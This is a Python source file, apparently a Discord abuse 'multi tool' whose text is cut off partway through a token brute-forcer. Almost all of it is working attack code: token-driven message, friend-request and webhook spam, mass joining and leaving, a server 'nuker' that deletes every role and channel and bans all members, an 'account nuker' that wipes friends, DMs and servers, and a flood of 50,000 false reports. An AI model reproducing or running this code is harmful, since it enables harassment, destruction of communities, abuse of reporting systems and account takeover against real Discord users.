# Made by Lososik | https://github.com/Lososiik | https://dsc.gg/deadd
# You need to have tokens.txt at same folder, at tokens.txt put your own tokens. For token bruteforcer you need to create .txt file named grab.txt
# You need to write to cmd: pip install discord, pip install pyautoui, pip install requests. Without it, the code will not work.
# © PussyKiller discord multi tool

import threading
from discord.ext import commands
import discord
import pyautogui
import time
from requests import post
from random import randint
import re
import http.client
import random
import json
import requests
from threading import Thread
from requests import Session
import base64
import string
import sys


def randstr(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]
    return text




def friender(token, user):
    try:
        user = user.split("#")
        headers = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-GB",
            "authorization": token,
            "content-length": "90",
            "content-type": "application/json",
            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
            "origin": "https://discord.com",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
        }
        payload = {"username": user[0], "discriminator": user[1]}
        src = requests.post('https://canary.discordapp.com/api/v6/users/@me/relationships', headers=headers,
                            json=payload)
        if src.status_code == 204:
            print(f"[+] Friend request sent to {user[0]}#{user[1]}! [{token}]")
    except Exception as e:
        print(e)


def spammer():
    print("")
    print("▒█▀▀█ █░░█ █▀▀ █▀▀ █░░█ 　 ▒█░▄▀ ░▀░ █░░ █░░ █▀▀ █▀▀█")
    print("▒█▄▄█ █░░█ ▀▀█ ▀▀█ █▄▄█ 　 ▒█▀▄░ ▀█▀ █░░ █░░ █▀▀ █▄▄▀")
    print("▒█░░░ ░▀▀▀ ▀▀▀ ▀▀▀ ▄▄▄█ 　 ▒█░▒█ ▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀░▀▀")

    print("                                      Made by Lososik")

    print('[1] Spammer        [7] Webhook spammer')
    print('[2] Friend spammer [8] Nuker')
    print('[3] Joiner         [9] Account Nuker')
    print('[4] Leaver         [10] MassReport')
    print('[5] Typing spammer [11] Token Bruteforce')
    print('[6] Token checker  [12] About')

    choice = int(input('[?]> '))


    if choice == 1:
        print("")
        print('█▀█ █░█ █▀ █▀ █▄█   █▄▀ █ █░░ █░░ █▀▀ █▀█   █▀ █▀█ ▄▀█ █▀▄▀█ █▀▄▀█ █▀▀ █▀█')
        print('█▀▀ █▄█ ▄█ ▄█ ░█░   █░█ █ █▄▄ █▄▄ ██▄ █▀▄   ▄█ █▀▀ █▀█ █░▀░█ █░▀░█ ██▄ █▀▄')

        tokens = open("tokens.txt", "r").read().splitlines()
        channel = input('Chanel ID: ')
        mess = input('Message: ')
        delay = float(input('Delay: '))

        def spam(token, mess):
            url = 'https://discord.com/api/v9/channels/' + channel + '/messages'
            data = {"content": mess}
            header = {"authorization": token}

            while True:
                time.sleep(delay)
                src = requests.post(url, data, headers=header)
                if src.status_code == 429:
                    ratelimit = json.loads(src.content)
                    print("Ratelimit for", str(float(ratelimit['retry_after'])) + " seconds")
                    time.sleep(float(ratelimit['retry_after']))

                elif src.status_code == 401:
                    print('Invalid token')
                elif src.status_code == 404:
                    print('Not found ¯\_(ツ)_/¯')
                elif src.status_code == 403:
                    print('Token havent got access to this channel')

        def thread():
            text = mess
            for token in tokens:
                threading.Thread(target=spam, args=(token, text)).start()

        start = input('Press eny key to start: ')
        start = thread()

        exit = input('press any key: ')
        exit = spammer()




    if choice == 2:
        print('''╔═══╗─────────────╔╗╔═╗╔╗╔╗──────╔═══╗──────────╔╗
║╔═╗║─────────────║║║╔╝║║║║──────║╔══╝──────────║║
║╚═╝╠╗╔╦══╦══╦╗─╔╗║╚╝╝╔╣║║║╔══╦═╗║╚══╦═╦╦══╦═╗╔═╝╠══╦═╗╔══╦══╦══╦╗╔╦╗╔╦══╦═╗
║╔══╣║║║══╣══╣║─║║║╔╗║╠╣║║║║║═╣╔╝║╔══╣╔╬╣║═╣╔╗╣╔╗║║═╣╔╝║══╣╔╗║╔╗║╚╝║╚╝║║═╣╔╝
║║──║╚╝╠══╠══║╚═╝║║║║╚╣║╚╣╚╣║═╣║─║║──║║║║║═╣║║║╚╝║║═╣║─╠══║╚╝║╔╗║║║║║║║║═╣║
╚╝──╚══╩══╩══╩═╗╔╝╚╝╚═╩╩═╩═╩══╩╝─╚╝──╚╝╚╩══╩╝╚╩══╩══╩╝─╚══╣╔═╩╝╚╩╩╩╩╩╩╩══╩╝
─────────────╔═╝║─────────────────────────────────────────║║
─────────────╚══╝─────────────────────────────────────────╚╝ ''')


        user = input("User (example nehehe#9999): ")
        tokens = open("tokens.txt", "r").read().splitlines()
        delay = float(input('Delay: '))
        for token in tokens:
            time.sleep(delay)
            threading.Thread(target=friender, args=(token, user)).start()

        exit = input('press any key: ')
        exit = spammer()


    if choice == 3:
        print('')
        print('█▀█ █░█ █▀ █▀ █▄█   █▄▀ █ █░░ █░░ █▀▀ █▀█   ░░█ █▀█ █ █▄░█ █▀▀ █▀█')
        print('█▀▀ █▄█ ▄█ ▄█ ░█░   █░█ █ █▄▄ █▄▄ ██▄ █▀▄   █▄█ █▄█ █ █░▀█ ██▄ █▀▄')


        http.client._is_legal_header_name = re.compile(rb'[^\s][^:\r\n]*').fullmatch


        tokens = open("tokens.txt", "r").read().splitlines()


        def join(invite, token):  # with this code help me my friend H0LLOW
            token = token.replace("\r", "")
            token = token.replace("\n", "")
            headers = {
                ":authority": "canary.discord.com",
                ":method": "POST",
                ":path": "/api/v9/invites/" + invite,
                ":scheme": "https",
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US",
                "Authorization": token,
                "content-length": "0",
                "cookie": "__dcfduid=75af9050ff6211ebad731ffdee3c037e; __sdcfduid=75af9051ff6211ebad731ffdee3c037e933998e6356b1dffdf296486c9c67f3f52108589d44d26d29febc86909e52537; __stripe_mid=b1d29ec9-19c8-41d7-9ace-e35266d8e9d1725cd3; __cfruid=402026f51d740991320e719ec5b87763fb9f0b58-1630164866",
                "origin": "https://canary.discord.com",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.600 Chrome/91.0.4472.106 Electron/13.1.4 Safari/537.36",
                "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
            }
            requests.post("https://discordapp.com/api/v9/invites/" + invite, headers=headers)


        invite = input("Discord server invite: ")
        invite = invite.replace("https://discord.gg/", "")
        invite = invite.replace("discord.gg/", "")
        invite = invite.replace("https://discord.com/invite/", "")

        delay = float(input('Delay: '))


        for token in tokens:
            time.sleep(delay)
            threading.Thread(target=join, args=(invite, token)).start()


        print('[+] Done')


        exit = input('press any key: ')
        exit = spammer()


    if choice == 4:
        print('')
        print('█▀█ █░█ █▀ █▀ █▄█   █▄▀ █ █░░ █░░ █▀▀ █▀█   █░░ █▀▀ ▄▀█ █░█ █▀▀ █▀█')
        print('█▀▀ █▄█ ▄█ ▄█ ░█░   █░█ █ █▄▄ █▄▄ ██▄ █▀▄   █▄▄ ██▄ █▀█ ▀▄▀ ██▄ █▀▄')


        token = open("tokens.txt", "r").read().splitlines()

        ID = input('Discord Server ID: ')

        apilink = "https://discordapp.com/api/v9/users/@me/guilds/" + str(ID)

        with open('tokens.txt', 'r') as handle:
            tokens = handle.readlines()
            for i in tokens:
                token = i.rstrip()
                headers = {
                    'Authorization': token
                }
                requests.delete(apilink, headers=headers)
            print('[+] Successfully left guild')

        exit = input('press any key: ')
        exit = spammer()


    if choice == 5:
        print('')
        print('╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╱╱╭╮╱╱╭╮╭╮╱╱╱╱╱╱╱╭╮')
        print('┃╭━╮┃╱╱╱╱╱╱╱╱╱╱╱╱╱┃┃╱╱┃┃┃┃╱╱╱╱╱╱╭╯╰╮')
        print('┃╰━╯┣╮╭┳━━┳━━┳╮╱╭╮┃┃╭┳┫┃┃┃╭━━┳━╮╰╮╭╋╮╱╭┳━━┳┳━╮╭━━╮╭━━┳━━┳━━┳╮╭┳╮╭┳━━┳━╮')
        print('┃╭━━┫┃┃┃━━┫━━┫┃╱┃┃┃╰╯╋┫┃┃┃┃┃━┫╭╯╱┃┃┃┃╱┃┃╭╮┣┫╭╮┫╭╮┃┃━━┫╭╮┃╭╮┃╰╯┃╰╯┃┃━┫╭╯')
        print('┃┃╱╱┃╰╯┣━━┣━━┃╰━╯┃┃╭╮┫┃╰┫╰┫┃━┫┃╱╱┃╰┫╰━╯┃╰╯┃┃┃┃┃╰╯┃┣━━┃╰╯┃╭╮┃┃┃┃┃┃┃┃━┫┃')
        print('╰╯╱╱╰━━┻━━┻━━┻━╮╭╯╰╯╰┻┻━┻━┻━━┻╯╱╱╰━┻━╮╭┫╭━┻┻╯╰┻━╮┃╰━━┫╭━┻╯╰┻┻┻┻┻┻┻━━┻╯')
        print('╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃┃┃╱╱╱╱╱╭━╯┃╱╱╱┃┃')
        print('╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯╰╯╱╱╱╱╱╰━━╯╱╱╱╰╯')


        message = input("Message: ")
        amount = int(input("Amount of messages: "))
        delay = float(input('Delay: '))


        ready = input("Press enter when you will be ready: ")


        print("10 seconds to typing spam")


        for seconds in range(10, 0, -1):
            print(seconds)
            time.sleep(1)
        print('Spamming')


        for i in range(0, amount):
            if message != "":
                pyautogui.typewrite(message)
                pyautogui.press("enter")
            else:
                pyautogui.hotkey("ctrl", "v")
                pyautogui.press("enter")

            print(f'[+] {message} sent')
            time.sleep(delay / 1000)


        print("Done\n")


        exit = input('press any key: ')
        exit = spammer()


    if choice == 6:
        print('')
        print('█▀█ █░█ █▀ █▀ █▄█   █▄▀ █ █░░ █░░ █▀▀ █▀█   ▀█▀ █▀█ █▄▀ █▀▀ █▄░█   █▀▀ █░█ ▄▀█ █▀▀ █▄▀ █▀▀ █▀█')
        print('█▀▀ █▄█ ▄█ ▄█ ░█░   █░█ █ █▄▄ █▄▄ ██▄ █▀▄   ░█░ █▄█ █░█ ██▄ █░▀█   █▄▄ █▀█ █▀█ █▄▄ █░█ ██▄ █▀▄')


        def checker(token):
            response = post(f'https://discord.com/api/v6/invite/{randint(1, 9999999)}',
                            headers={'Authorization': token})
            if "You need to verify your account in order to perform this action." in str(
                    response.content) or "401: Unauthorized" in str(response.content):
                return False
            elif response.status_code == 401:
                return 'Invalid'
            else:
                return True


        def manager():
            if __name__ == "__main__":
                try:
                    checked = []
                    with open('tokens.txt', 'r') as tokens:
                        for token in tokens.read().split('\n'):
                            if len(token) > 15 and token not in checked and checker(token) == True:
                                print(f'{token} Valid')
                                checked.append(token)
                            else:
                                print(f'{token}  Invalid')
                    if len(checked) > 0:
                        save = input(f'{len(checked)} Valid\nDo you want to Save only Valid tokens? (y/n): ').lower()
                        if save == 'y':
                            name = 'tokens'
                            with open(f'{name}.txt', 'w') as saveFile:
                                saveFile.write('\n'.join(checked))
                            print(f'Tokens saved to {name}.txt file!')
                except:
                    input('Error, cant open tokens.txt file...... :(!')


        start = input('press any key to start: ')
        start = manager()


        exit = input('press any key to return to the menu: ')
        exit = spammer()


    if choice == 7:
        print('''
┏━━━┓╋╋╋╋╋╋╋╋╋╋╋╋╋┏┓╋╋┏┓┏┓╋╋╋╋╋╋╋╋╋╋╋╋╋╋┏┓╋┏┓╋╋╋╋╋╋╋┏┓
┃┏━┓┃╋╋╋╋╋╋╋╋╋╋╋╋╋┃┃╋╋┃┃┃┃╋╋╋╋╋╋╋╋╋╋╋╋╋╋┃┃╋┃┃╋╋╋╋╋╋╋┃┃
┃┗━┛┣┓┏┳━━┳━━┳┓╋┏┓┃┃┏┳┫┃┃┃┏━━┳━┓┏┓┏┓┏┳━━┫┗━┫┗━┳━━┳━━┫┃┏┓┏━━┳━━┳━━┳┓┏┳┓┏┳━━┳━┓
┃┏━━┫┃┃┃━━┫━━┫┃╋┃┃┃┗┛╋┫┃┃┃┃┃━┫┏┛┃┗┛┗┛┃┃━┫┏┓┃┏┓┃┏┓┃┏┓┃┗┛┛┃━━┫┏┓┃┏┓┃┗┛┃┗┛┃┃━┫┏┛
┃┃╋╋┃┗┛┣━━┣━━┃┗━┛┃┃┏┓┫┃┗┫┗┫┃━┫┃╋┗┓┏┓┏┫┃━┫┗┛┃┃┃┃┗┛┃┗┛┃┏┓┓┣━━┃┗┛┃┏┓┃┃┃┃┃┃┃┃━┫┃
┗┛╋╋┗━━┻━━┻━━┻━┓┏┛┗┛┗┻┻━┻━┻━━┻┛╋╋┗┛┗┛┗━━┻━━┻┛┗┻━━┻━━┻┛┗┛┗━━┫┏━┻┛┗┻┻┻┻┻┻┻━━┻┛
╋╋╋╋╋╋╋╋╋╋╋╋╋┏━┛┃╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋┃┃
╋╋╋╋╋╋╋╋╋╋╋╋╋┗━━┛╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋┗┛ ''')


        def webhkspammer():
            webhook = input("Webhook Link: ")
            message = input("Message: ")
            delay = float(input("Delay: "))

            while True:
                print("Sending: " + message)
                print(" ")
                try:
                    time.sleep(delay)
                    _data = requests.post(webhook, json={'content': message})

                    if _data.status_code == 204:
                        print("Sending: " + message)
                except:
                    print("Error:\n" + webhook)
                    time.sleep(5)


        def thread():
            threading.Thread(target=webhkspammer(), args=(message)).start()
            print(f'[+] {message} sent')


        thread()


        exit = input('press any key to exit: ')
        exit = spammer()


    if choice == 8:
        print('')
        print('╭━━━┳╮╱╭┳━━━┳━━━┳╮╱╱╭╮╭╮╭━┳━━┳╮╱╱╭╮╱╱╭━━━┳━━━╮╭━╮╱╭┳╮╱╭┳╮╭━┳━━━┳━━━╮')
        print('┃╭━╮┃┃╱┃┃╭━╮┃╭━╮┃╰╮╭╯┃┃┃┃╭┻┫┣┫┃╱╱┃┃╱╱┃╭━━┫╭━╮┃┃┃╰╮┃┃┃╱┃┃┃┃╭┫╭━━┫╭━╮┃')
        print('┃╰━╯┃┃╱┃┃╰━━┫╰━━╋╮╰╯╭╯┃╰╯╯╱┃┃┃┃╱╱┃┃╱╱┃╰━━┫╰━╯┃┃╭╮╰╯┃┃╱┃┃╰╯╯┃╰━━┫╰━╯┃')
        print('┃╭━━┫┃╱┃┣━━╮┣━━╮┃╰╮╭╯╱┃╭╮┃╱┃┃┃┃╱╭┫┃╱╭┫╭━━┫╭╮╭╯┃┃╰╮┃┃┃╱┃┃╭╮┃┃╭━━┫╭╮╭╯')
        print('┃┃╱╱┃╰━╯┃╰━╯┃╰━╯┃╱┃┃╱╱┃┃┃╰┳┫┣┫╰━╯┃╰━╯┃╰━━┫┃┃╰╮┃┃╱┃┃┃╰━╯┃┃┃╰┫╰━━┫┃┃╰╮')
        print('╰╯╱╱╰━━━┻━━━┻━━━╯╱╰╯╱╱╰╯╰━┻━━┻━━━┻━━━┻━━━┻╯╰━╯╰╯╱╰━┻━━━┻╯╰━┻━━━┻╯╰━╯')


        TOKEN = input('Bot token: ')


        print('[1]> Nuke')
        print('[2]> Ban')


        MAX_CHANNELS = 500


        choicee = int(input('[?]>'))


        if choicee == 1:
            chanless = input('Channels names: ')
            spam = input('Message you wanna spam: ')
            print('For nuke write to chat: !Nuke')


        if choicee == 2:
            reason = input('Bans reason: ')
            print('For for banning one guy write to chat: !OneBan')
            print('For mass ban write to chat: !Ban')


        client = commands.Bot(command_prefix="!")


        @client.command()
        async def Nuke(ctx):
            await ctx.message.delete()
            guild = ctx.guild


            for role in guild.roles:
                try:
                    await role.delete()
                    print(f'{role.name} Has been deleted')
                except:
                    print(f'[-] {role.name} Has not been deleted')


            for channel in guild.channels:
                try:
                    await channel.delete()
                    print(f'[+] {channel.name} Has been deleted')
                except:
                    print(f'[-] You cant delete {channel}')


            try:
                for i in range(MAX_CHANNELS):
                    await guild.create_text_channel(chanless)
                    print(f'[+] {chanless} has been created')
            except:
                print('[-] You havent got permission to create channels')


        @client.command(pass_context=True)
        async def Ban(ctx):
            await ctx.message.delete()
            guild = ctx.message.guild
            for member in list(client.get_all_members()):
                try:
                    await guild.ban(member)
                    print('[+] User '+member.name+" has been banned")
                except:
                    print('[-] You havent got permission to ban :(')


        @client.command()
        async def OneBan(ctx, member : discord.Member):
            await ctx.message.delete()
            try:
                await member.ban(reason=reason)
                print(f'[+] {member} was banned')
            except:
                print(f'[-] You dont have permission to ban {member}')


        @client.event
        async def on_guild_channel_create(channel):
            while True:
                try:
                    await channel.send(spam)
                    print('[+] SPAMMIMG :)')

                except:
                    print('[-] You cant spam lmaoooo')


        def thread():
                threading.Thread(target=on_guild_channel_create, args=(TOKEN)).start()


        client.run(TOKEN)
        exit = input('press any key: ')
        exit = spammer()


    if choice == 9:
        print('''
╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╱╱╭╮╭━╮╭╮╭╮╱╱╱╱╱╱╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭╮╱╭━╮╱╭╮╱╱╭╮
┃╭━╮┃╱╱╱╱╱╱╱╱╱╱╱╱╱┃┃┃╭╯┃┃┃┃╱╱╱╱╱╱┃╭━╮┃╱╱╱╱╱╱╱╱╱╱╱╱╱╭╯╰╮┃┃╰╮┃┃╱╱┃┃
┃╰━╯┣╮╭┳━━┳━━┳╮╱╭╮┃╰╯╯╭┫┃┃┃╭━━┳━╮┃┃╱┃┣━━┳━━┳━━┳╮╭┳━╋╮╭╯┃╭╮╰╯┣╮╭┫┃╭┳━━┳━╮
┃╭━━┫┃┃┃━━┫━━┫┃╱┃┃┃╭╮┃┣┫┃┃┃┃┃━┫╭╯┃╰━╯┃╭━┫╭━┫╭╮┃┃┃┃╭╮┫┃╱┃┃╰╮┃┃┃┃┃╰╯┫┃━┫╭╯
┃┃╱╱┃╰╯┣━━┣━━┃╰━╯┃┃┃┃╰┫┃╰┫╰┫┃━┫┃╱┃╭━╮┃╰━┫╰━┫╰╯┃╰╯┃┃┃┃╰╮┃┃╱┃┃┃╰╯┃╭╮┫┃━┫┃
╰╯╱╱╰━━┻━━┻━━┻━╮╭╯╰╯╰━┻┻━┻━┻━━┻╯╱╰╯╱╰┻━━┻━━┻━━┻━━┻╯╰┻━╯╰╯╱╰━┻━━┻╯╰┻━━┻╯
╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃
╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯''')


        tokenn = input("Token: ")
        print('''
[1] Server spam
[2] Remove all friends
[3] Block all friends
[4] Spam settings
[5] Leave all servers
[6] Close all DMs
[7] Send mass DM
[8] Delete all personal Servers''')

        def generate_random_string(Ammount):
            string_returned = "".join(
                random.choice(string.ascii_letters) for i in range(0, Ammount)
            )
            return string_returned

        def servers(Token):
            headers = {"authorization": Token, "user-agent": "bruh6/9"}
            for count, i in enumerate(range(0, 25)):
                payload = {"name": generate_random_string(15)}
                spam_server_request = requests.post(
                    "https://canary.discord.com/api/v8/guilds", headers=headers, json=payload
                )

        def remove_friends(Token):
            headers = {"authorization": Token, "user-agent": "bruh6/9"}
            remove_friends_request = requests.get(
                "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
            ).json()
            for i in remove_friends_request:
                requests.delete(
                    f"https://canary.discord.com/api/v8/users/@me/relationships/{i['id']}",
                    headers=headers,
                )
                print(f"Removed Friend {i['id']}")

        def block_friends(Token):
            headers = {"authorization": Token, "user-agent": "bruh6/9"}
            json = {"type": 2}
            block_friends_request = requests.get(
                "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
            ).json()
            for i in block_friends_request:
                requests.put(
                    f"https://canary.discord.com/api/v8/users/@me/relationships/{i['id']}",
                    headers=headers,
                    json=json,
                )
                print(f"Blocked Friend {i['id']}")

        def settings(Token):
            print('Started Job')
            for i in range(0, 100):
                headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
                condition_status = True
                payload = {"theme": "light", "developer_mode": condition_status, "afk_timeout": 60, "locale": "ko",
                           "message_display_compact": condition_status, "explicit_content_filter": 2,
                           "default_guilds_restricted": condition_status,
                           "friend_source_flags": {"all": condition_status, "mutual_friends": condition_status,
                                                   "mutual_guilds": condition_status},
                           "inline_embed_media": condition_status, "inline_attachment_media": condition_status,
                           "gif_auto_play": condition_status, "render_embeds": condition_status,
                           "render_reactions": condition_status, "animate_emoji": condition_status,
                           "convert_emoticons": condition_status, "animate_stickers": 1,
                           "enable_tts_command": condition_status, "native_phone_integration_enabled": condition_status,
                           "contact_sync_enabled": condition_status, "allow_accessibility_detection": condition_status,
                           "stream_notifications_enabled": condition_status, "status": "idle",
                           "detect_platform_accounts": condition_status, "disable_games_tab": condition_status}
                requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload)
                condition_status = False
                payload = {"theme": "dark", "developer_mode": condition_status, "afk_timeout": 120, "locale": "bg",
                           "message_display_compact": condition_status, "explicit_content_filter": 0,
                           "default_guilds_restricted": condition_status,
                           "friend_source_flags": {"all": condition_status, "mutual_friends": condition_status,
                                                   "mutual_guilds": condition_status},
                           "inline_embed_media": condition_status, "inline_attachment_media": condition_status,
                           "gif_auto_play": condition_status, "render_embeds": condition_status,
                           "render_reactions": condition_status, "animate_emoji": condition_status,
                           "convert_emoticons": condition_status, "animate_stickers": 2,
                           "enable_tts_command": condition_status, "native_phone_integration_enabled": condition_status,
                           "contact_sync_enabled": condition_status, "allow_accessibility_detection": condition_status,
                           "stream_notifications_enabled": condition_status, "status": "dnd",
                           "detect_platform_accounts": condition_status, "disable_games_tab": condition_status}
                requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload)

        def server_leave(Token):
            headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
            leave_all_servers_request = requests.get(
                "https://canary.discord.com/api/v8/users/@me/guilds", headers=headers
            ).json()
            for guild in leave_all_servers_request:
                requests.delete(
                    f"https://canary.discord.com/api/v8/users/@me/guilds/{guild['id']}",
                    headers=headers,
                )
                print(f"Left Guild: {guild['id']}")

        def dms_close(Token):
            headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
            close_dm_request = requests.get(
                "https://canary.discord.com/api/v8/users/@me/channels", headers=headers
            ).json()
            for channel in close_dm_request:
                requests.delete(
                    f"https://canary.discord.com/api/v8/channels/{channel['id']}",
                    headers=headers,
                )

        def mass_dm(Token):
            headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
            mass_dm_request = requests.get(
                "https://canary.discord.com/api/v8/users/@me/channels", headers=headers
            ).json()
            for channel in mass_dm_request:
                json = {"content": input('Message: ')}
                time.sleep(1)
                r = requests.post(
                    f"https://canary.discord.com/api/v8/channels/{channel['id']}/messages",
                    headers=headers,
                    data=json,
                )
                print(f"Sent DM To {channel['id']}")

        def delete_servers(Token):
            headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
            print("Got Data")
            delete_personal_request = requests.get(
                "https://discord.com/api/v9/users/@me/guilds", headers=headers
            ).json()
            for i in delete_personal_request:
                requests.post(
                    f"https://canary.discord.com/api/v9/guilds/{i['id']}/delete",
                    headers=headers,
                )
                print(i["id"])


        options_list = {
            "1": servers,
            "2": remove_friends,
            "3": block_friends,
            "4": settings,
            "5": server_leave,
            "6": dms_close,
            "7": mass_dm,
            "8": delete_servers
        }

        def main():
            choiceee = input("[?]> ")
            if choiceee == 1:
                servers()
            if choiceee == 2:
                remove_friends()
            if choiceee == 3:
                block_friends()
            if choiceee == 4:
                settings()
            if choiceee == 5:
                server_leave()
            if choiceee == 6:
                dms_close()
            if choiceee == 7:
                mass_dm()
            if choiceee == 8:
                delete_servers()
            else:
                options_list[choiceee](tokenn)

        if __name__ == "__main__":
            while 1:
                try:
                    main()
                except KeyboardInterrupt:
                    sys.exit()

        exit = input('press any key: ')
        exit = spammer()

    if choice == 10:

        print('''╔═══╗─────────────╔╗╔═╗╔╗╔╗──────╔═╗╔═╗─────────╔═══╗──────────╔╗
║╔═╗║─────────────║║║╔╝║║║║──────║║╚╝║║─────────║╔═╗║─────────╔╝╚╗
║╚═╝╠╗╔╦══╦══╦╗─╔╗║╚╝╝╔╣║║║╔══╦═╗║╔╗╔╗╠══╦══╦══╗║╚═╝╠══╦══╦══╦╩╗╔╝
║╔══╣║║║══╣══╣║─║║║╔╗║╠╣║║║║║═╣╔╝║║║║║║╔╗║══╣══╣║╔╗╔╣║═╣╔╗║╔╗║╔╣║
║║──║╚╝╠══╠══║╚═╝║║║║╚╣║╚╣╚╣║═╣║─║║║║║║╔╗╠══╠══║║║║╚╣║═╣╚╝║╚╝║║║╚╗
╚╝──╚══╩══╩══╩═╗╔╝╚╝╚═╩╩═╩═╩══╩╝─╚╝╚╝╚╩╝╚╩══╩══╝╚╝╚═╩══╣╔═╩══╩╝╚═╝
─────────────╔═╝║──────────────────────────────────────║║
─────────────╚══╝──────────────────────────────────────╚╝ 
''')


        sent = 0
        session = Session()
        print('[1] illegal Conent')
        print('[2] Harrassment')
        print('[3] Spam or Phishing Links')
        print('[4] Self harm')
        print('[5] NSFW Content')


        tokeen = input("Token: ")
        headers = {'Authorization': tokeen, 'Content-Type': 'application/json'}
        r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
        if r.status_code == 200:
            pass
        else:
            print("Invalid Token")
            input()
        id = input("Server ID: ")
        id1 = input("Channel ID: ")
        message = input("Message ID: ")
        reason = input("Option: ")


        def Main():
            global sent
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36',
                'Authorization': tokeen,
                'Content-Type': 'application/json'
            }


            payload = {
                'channel_id': id1,
                'guild_id': id,
                'message_id': message,
                'reason': reason
            }


            while True:
                sent = 0
                r = requests.post('https://discord.com/api/v6/report', headers=headers, json=payload)
                if r.status_code == 201:
                    print("Sent Report")
                    sent += 1


                elif r.status_code == 401:
                    print("Invalid token")
                    input()


                else:
                    print("Error")


        print()
        for i in range(50000):
            Thread(target=Main).start()

        exit = input('press any key: ')
        exit = spammer()


    if choice == 11:
        print('''╭━╮╱╭━┳━╮╱╱╭┳┳╮╱╱╱╱╱╱╱╱╭━━╮╭╮╱╱╱╱╱╱╭━━╮╱╱╱╭╮╱╱╭━╮
┃╋┣┳┫━┫━╋┳╮┃╭╋╋╮╭╮╭━┳┳╮╰╮╭┻┫┣┳━┳━┳╮┃╭╮┣┳┳┳┫╰┳━┫━╋━┳┳┳━┳━┳┳╮
┃╭┫┃┣━┣━┃┃┃┃╰┫┃╰┫╰┫┻┫╭╯╱┃┃╋┃━┫┻┫┃┃┃┃╭╮┃╭┫┃┃╭┫┻┫╭┫╋┃╭┫━┫┻┫╭╯
╰╯╰━┻━┻━╋╮┃╰┻┻┻━┻━┻━┻╯╱╱╰┻━┻┻┻━┻┻━╯╰━━┻╯╰━┻━┻━┻╯╰━┻╯╰━┻━┻╯
╱╱╱╱╱╱╱╱╰━╯ 
Do not do this without the permission of the person to whom the bruteforce attack is conducted.''')


        id_to_token = base64.b64encode((input("Id of user: ")).encode("ascii"))
        id_to_token = str(id_to_token)[2:-1]

        def bruteforece():
            while id_to_token == id_to_token:
                token = id_to_token + '.' + ('').join(
                    random.choices(string.ascii_letters + string.digits, k=4)) + '.' + (
